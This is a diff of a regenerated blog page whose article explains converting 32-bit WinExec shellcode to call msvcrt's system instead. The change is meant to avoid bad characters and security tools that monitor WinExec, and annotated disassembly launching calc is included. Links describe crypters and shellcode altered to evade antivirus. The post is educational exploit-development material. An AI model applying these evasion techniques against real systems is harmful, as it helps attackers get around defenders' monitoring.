@@ -110,8 +110,8 @@
                 <a href="../tag/nus.html" >NUS (3)</a> &#124; 
                 <a href="../tag/security.html" >Security (117)</a> &#124; 
                 <a href="../tag/server.html" >Server (26)</a> &#124; 
-                <a href="../tag/untagged.html" >Untagged (16)</a> &#124; 
-                <a href="../archives.html" >Archives (166)</a>
+                <a href="../tag/untagged.html" >Untagged (17)</a> &#124; 
+                <a href="../archives.html" >Archives (167)</a>
         </div>
     </div>
 
@@ -134,7 +134,7 @@
       <div class="entry-content">
         <p>I have found an interesting method to convert <code>WinExec</code> shellcode. This may be useful if <code>WinExec</code> cannot be used because the characters <code>WinE</code> are bad characters or if there are security solutions monitoring for its execution. This method requires <code>msvcrt.dll</code> to be loaded as it uses the <code>system</code> call in place of <code>WinExec</code>. Both methods take in similar parameters so this can be achieved with only a few bytes of code change.  </p>
 <p>As an example, I will be using this <a href="https://github.com/peterferrie/win-exec-calc-shellcode/blob/master/w32-exec-calc-shellcode.asm">32bit WinExec calc shellcode</a>. Credits to Skylined and Peter Ferrie for the original shellcode and the extremely detailed comments. As you can observe, we saved 1 byte with uCmdShow and inserted only 6 more bytes for the entire conversion. Depending on the DLL load order for your binary, it may take slightly more or less bytes to traverse the linked list to get to <code>msvcrt</code>.</p>
-<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
 <span class="normal"> 2</span>
 <span class="normal"> 3</span>
 <span class="normal"> 4</span>
@@ -164,7 +164,7 @@
 <span class="normal">28</span>
 <span class="normal">29</span>
 <span class="normal">30</span>
-<span class="normal">31</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>0:  31 d2                   xor    edx,edx                          ; EDX = 0
+<span class="normal">31</span></pre></div></td><td class="code"><div><pre><span></span><code>0:  31 d2                   xor    edx,edx                          ; EDX = 0
 2:  52                      push   edx                              ; Stack = 0
 3:  68 63 61 6c 63          push   0x636c6163                       ; Stack = &quot;calc&quot;, 0
 8:  54                      push   esp
@@ -195,8 +195,7 @@ c:  64 8b 72 30             mov    esi,DWORD PTR fs:[edx+0x30]      ; ESI = [TEB
 47: 01 fe                   add    esi,edi                          ; ESI = msvcrt + offset(address table) = &amp;(address table)
 49: 03 3c ae                add    edi,DWORD PTR [esi+ebp*4]        ; EDI = msvcrt + [&amp;(address table)[system ordinal]] = offset(system) = &amp;(system)
 4c: ff d7                   call   edi                              ; system(&amp;(&quot;calc&quot;));
-</code></pre></div>
-</td></tr></table>
+</code></pre></div></td></tr></table></div>
       </div><!-- .entry-content -->
       <br /><br />
       <div class="article_meta">
@@ -206,24 +205,24 @@ c:  64 8b 72 30             mov    esi,DWORD PTR fs:[edx+0x30]      ; ESI = [TEB
         <h2>Similar Articles</h2>
           <div class="similararticlerow">
               <blockquote class="similar_posts">
-              <a href="../articles/slae64-7-crypters.html"><b>SLAE64 #7 - Crypters
-              (99% Similar) - </b>
-              Since shellcode is usually very small in size, I have used RSA asymmetric encryption to encrypt the shellcode. Most of the code is boilerplate code so there is not much to talk about. Encryptor. ...</a>
-              </blockquote>
-              <blockquote class="similar_posts">
               <a href="../articles/slae64-4-sse42-crc32c-encoder.html"><b>SLAE64 #4 - SSE4.2 CRC32C Encoder
               (99% Similar) - </b>
               I decided to do something special for the custom encoder shellcode. I used the Intel SSE4.2 CRC32C function to encode the shellcode. CRC32 is a hash function, not an encoding function, so in ...</a>
               </blockquote>
               <blockquote class="similar_posts">
-              <a href="../articles/slae64-3-egghunter-shellcode.html"><b>SLAE64 #3 - Egghunter shellcode
-              (96% Similar) - </b>
-              As usual, I will only be touching on interesting or unique points in the shellcode. Line 25/26: To avoid having the egg in memory, I moved 0x5090508f into a register and incremented it to get ...</a>
+              <a href="../articles/slae64-7-crypters.html"><b>SLAE64 #7 - Crypters
+              (98% Similar) - </b>
+              Since shellcode is usually very small in size, I have used RSA asymmetric encryption to encrypt the shellcode. Most of the code is boilerplate code so there is not much to talk about. Encryptor. ...</a>
               </blockquote>
               <blockquote class="similar_posts">
               <a href="../articles/slae64-6-polymorphic-shellcode.html"><b>SLAE64 #6 - Polymorphic shellcode
-              (96% Similar) - </b>
+              (97% Similar) - </b>
               I have taken shellcode #603 and #859 from shell-storm and created polymorphic version that passed clamav scan. The original version of both shellcodes were detected by clamav scan due to the ...</a>
+              </blockquote>
+              <blockquote class="similar_posts">
+              <a href="../articles/slae64-3-egghunter-shellcode.html"><b>SLAE64 #3 - Egghunter shellcode
+              (97% Similar) - </b>
+              As usual, I will only be touching on interesting or unique points in the shellcode. Line 25/26: To avoid having the egg in memory, I moved 0x5090508f into a register and incremented it to get ...</a>
               </blockquote>
           </div>
       </div>
@@ -256,7 +255,7 @@ c:  64 8b 72 30             mov    esi,DWORD PTR fs:[edx+0x30]      ; ESI = [TEB
                     <a href="../feeds/all.atom.xml">Atom Feed</a> | 
                     <a href="../sitemap.xml">Sitemap</a><br />
                     This site uses the <a href="https://github.com/limbenjamin/voce">voce</a> theme by <a href="//limbenjamin.com/">Benjamin Lim</a><br />
-                    Page generated on Sun Sep 11 18:45:36 2022<br />
+                    Page generated on Thu Sep 29 18:42:42 2022<br />
                     &copy; 2012-2022 <a href="..">Benjamin Lim</a> </div>
         </div>
       </div><!-- .site-info -->
